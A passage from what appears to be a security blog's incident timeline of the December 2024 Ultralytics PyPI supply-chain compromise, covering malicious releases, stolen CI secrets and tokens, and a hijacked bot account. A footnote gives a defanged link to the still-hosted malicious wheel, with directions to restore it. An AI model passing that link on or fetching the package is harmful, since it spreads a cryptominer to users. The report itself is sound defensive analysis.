2024-12-05 12:47: Sigstore’s transparency log records [153589716](https://search.sigstore.dev/?logIndex=153589716) and [153589717](https://search.sigstore.dev/?logIndex=153589717) indicating two attestations, one for each of the distributions of v8.3.42 that will appear on PyPI (ultralytics-8.3.42.tar.gz and ultralytics-8.3.42-py3-none-any.whl).

-

2024-12-05 12:47: v8.3.42 is uploaded to PyPI with a Trusted Publisher and valid attestations for each distribution.

-

2024-12-05 13:03: [@renzhexigua](https://github.com/renzhexigua) announces on [#18027](https://github.com/ultralytics/ultralytics/issues/18027) that v8.3.42 is still malicious.

-

2024-12-05 13:47:30: v8.3.42 is removed from PyPI (approx. 1 hour after introduction).

-

2024-12-05 15:17: [@glenn-jocher](https://github.com/glenn-jocher) announces on [#18027](https://github.com/ultralytics/ultralytics/issues/18027) that the [@openimbot](https://github.com/openimbot) identity is banned from interacting with [Ultralytics](https://github.com/ultralytics/ultralytics).

-

2024-12-07 01:41:45: v8.3.45 is directly released to PyPI, with no CI/CD or repository activity from [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics). This was done with an API token and not a Trusted Publisher, and therefore has no attestations. This strongly suggests that the attacker either obtained a PyPI API token from the original secrets exfiltration phase or is in full control [pypi/u/glenn-jocher](https://pypi.org/user/glenn-jocher/).

-

2024-12-07 02:27:14: v8.3.46 is directly released to PyPI, with no CI/CD or repository activity from [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics). Like with v8.3.45, this release is done via API token and has no attestation.

-

2024-12-07 04:00: [Adnan Khan](https://github.com/AdnaneKhan) announces on [#18027](https://github.com/ultralytics/ultralytics/issues/18027) that v8.3.45 and v8.3.46 are still malcious, albiet with a different (simpler) miner payload.

-

2024-12-07 10:08:32: v8.3.45 is removed from PyPI (approx. 8 hours after introduction).

-

2024-12-07 10:09:08: v8.3.46 is removed from PyPI (approx. 7.5 hours after introduction).

In summary:

-

A total of 4 different releases of [Ultralytics](https://github.com/ultralytics/ultralytics) were malicious: v8.3.41, v8.3.42, v8.3.45, and v8.3.46.

- Of these releases, two were made via GitHub Actions and used Trusted Publishing + attestations, and two were made via an API token that the attacker likely either exfiltrated from a developer’s machine or from the GitHub Actions secret context (where it may have been forgotten about after Trusted Publishing was enabled).

-

All evidence strongly suggests that the attacker was able to fully exfiltrate all of the configured repository secrets within [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics). As such, the Ultralytics maintains must consider these credentials compromised and revoke them immediately to avoid further compromise. The failure to immediately revoke a stale API token may have been what enabled the follow-on direct releases of v8.3.45 and v8.3.46.

- In particular, in addition to any PyPI API tokens, the attacker may have access to a custom GitHub PAT configured as secrets._GITHUB_TOKEN in the Ultralytics CI. This must be considered compromised and revoked immediately.

-

All evidence strongly suggests that the attacker was in full control of the [@UltralyticsAssistant](https://github.com/UltralyticsAssistant) bot account, and may still have control over it.

-

The basic vulnerability that enabled this attack has been present in [ultralytics/actions](https://github.com/ultralytics/actions) since 2024-08-24 and was reintroduced after a previous disclosure. This strongly suggests a lack of adequate security controls and reviews within Ultralytics’ processes.

-

The release has been deleted and can no longer be resolved, but the malicious distribution is still available on PyPI’s storage: hxxps://files.pythonhosted.org/packages/d0/99/13d92174aa6a470d348a95e31164769f2cdf77838ea3c3e3fd476285777d/ultralytics-8.3.41-py3-none-any.whl (replace hxxps with https). [↩](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#fnref:file)

Discussions: [Mastodon](https://infosec.exchange/@yossarian/113607103858837241) [Bluesky](https://bsky.app/profile/yossarian.net/post/3lcnq3kt6k425) [Reddit](https://reddit.com/r/enosuchblog/comments/1h86yvv/zizmor_would_have_caught_the_ultralytics_workflow/)

[Previously](https://blog.yossarian.net/2024/11/18/Security-means-securing-people-where-they-are)

[Newer](https://blog.yossarian.net/2025/01/02/zizmor-1-0)
